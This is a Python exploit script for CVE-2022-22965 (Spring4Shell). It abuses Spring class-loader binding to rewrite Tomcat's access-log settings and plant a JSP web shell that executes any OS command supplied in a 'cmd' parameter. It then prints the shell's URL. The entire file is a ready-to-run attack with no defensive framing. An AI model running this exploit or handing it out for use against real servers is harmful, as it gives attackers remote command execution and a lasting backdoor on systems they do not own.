from urllib.parse import urlparse
import requests
import argparse
import urllib3
import time

urllib3.disable_warnings()

WEBShell= """%{directive}i page import="java.util.*,java.io.*" %{endtag}i %{starttag}i if(request.getParameter("%{parameter}i") != null){Process p = Runtime.getRuntime().exec(request.getParameter("%{parameter}i"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}} %{endtag}i"""
classes = [
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern',
    'class.module.classLoader.resources.context.parent.pipeline.first.suffix',
    'class.module.classLoader.resources.context.parent.pipeline.first.directory',
    'class.module.classLoader.resources.context.parent.pipeline.first.prefix',
    'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat',
]
Template_Variable = {
    'directive':'<%@',
    'endtag':'%>',
    'starttag':'<%',
    'parameter':'cmd'
}

def argv():
        parser = argparse.ArgumentParser(description='CVE-2022-22965 RCE Exploit')
        
        parser.add_argument('--url', help='target url EX) --url=http://localhost:8080', default="http://localhost:8080/exploit/greeting", dest="target", required=True)
        parser.add_argument('--file', help='WebShell file name to write to EX) --file=cmd', default="cmd", dest="filename")
        parser.add_argument('--dir', help='WebShell Directory Path to Write to. EX) --dir=webapps/ROOT',  default="webapps/ROOT")
        
        args = parser.parse_args()

        return args.filename, args.dir, args.target

def exploit():

    filename, directory, target = argv()
    
    payloads = {
        classes[0]:WEBShell,
        classes[1]:'.jsp',
        classes[2]:directory,
        classes[-2]:filename,
        classes[-1]:'',
    }
    

    ret = requests.post(target, data={classes[-1]:'_'})
    print(f"\033[92m[+] INFO - {classes[0]} Resetting : _")

    ret = requests.post(target, data=payloads)
    print(f"\033[92m[+] INFO - POST Response status code : {ret.status_code}\033[0m")

    time.sleep(3)

    ret = requests.get(target, headers=Template_Variable)

    print(f"\033[92m[+] INFO - GET Response status code : {ret.status_code}\033[0m")

    time.sleep(1)

    ret = requests.post(target, data={classes[0]:''})

    print(f"\033[92m[+] INFO - Exploit Success\033[0m\n")

    parse_target = urlparse(target)
    shellurl = f"{parse_target.scheme}://{parse_target.netloc}/{filename}.jsp"

    print(f"\033[95m[*] INFO - WebShell URL : {shellurl}\033[0m")

if __name__ == '__main__':
    exploit()